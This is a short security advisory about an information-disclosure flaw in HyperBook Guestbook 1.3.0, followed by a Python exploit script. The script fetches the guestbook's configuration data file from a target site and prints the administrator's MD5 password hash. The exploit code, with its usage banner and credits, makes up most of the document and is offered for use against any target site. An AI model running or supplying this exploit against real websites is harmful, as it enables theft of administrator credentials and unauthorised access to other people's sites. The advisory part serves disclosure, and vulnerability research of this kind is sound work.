source: http://www.securityfocus.com/bid/22754/info

HyperBook Guestbook is prone to an information-disclosure vulnerability because the application fails to protect sensitive information.

An attacker can exploit this issue to access sensitive information that may lead to other attacks.

This issue affects version 1.3.0; other versions may also be affected.

#!/usr/bin/python
#Script                  :HyperBook Guestbook v1.30 (qbconfiguration.dat) Remote Admin md5 Hash Exploit
#Exploit Coded by        : PeTrO
#Exploit Discovered by   : SaO [www.saohackstyle.com]
#Credits to              :[soulreaver],Kuzey
 

import urllib
import sys
import parser

serv=&#34;http://&#34;
i=0
for arg in sys.argv:
     i=i+1

if i!=3:
 print &#34;&#34;&#34;\n\n
         \tHyperBook Guestbook v1.30  (qbconfiguration.dat) 
         \t\t    Remote Admin md5 Hash Exploit 
          \t                            
          \tUsage:Exploit.py [targetsite] [path] 
          \tExample:Exploit.py www.target.com /guestbook/\n\n&#34;&#34;&#34;
else:
    

    adres=sys.argv[1]
    path=sys.argv[2]

    str1=adres.join([serv,path])
    str2=str1.join([&#39;&#39;,&#39;data/gbconfiguration.dat&#39;])

    print &#34;\n[~]Connecting...&#34;
    url=urllib.urlopen(str2).read(); 
    print &#34;\n[+]Connected!&#34;
 
    test=url.find(path);

    t=0;
    print &#34;\n\t\t\t-=[Admin md5 hash]=-&#34;
    while(url[test+1]!=1): #parsing hash... by PeTrO..
              print url[test],

              if(url[test]==&#39;\n&#39;):
                 t=t+1;  

              if(t==2):
                 break;
                
              test=test+1;

    print &#34;\n\n\t\t\t[ c0ded by PeTrO ]&#34;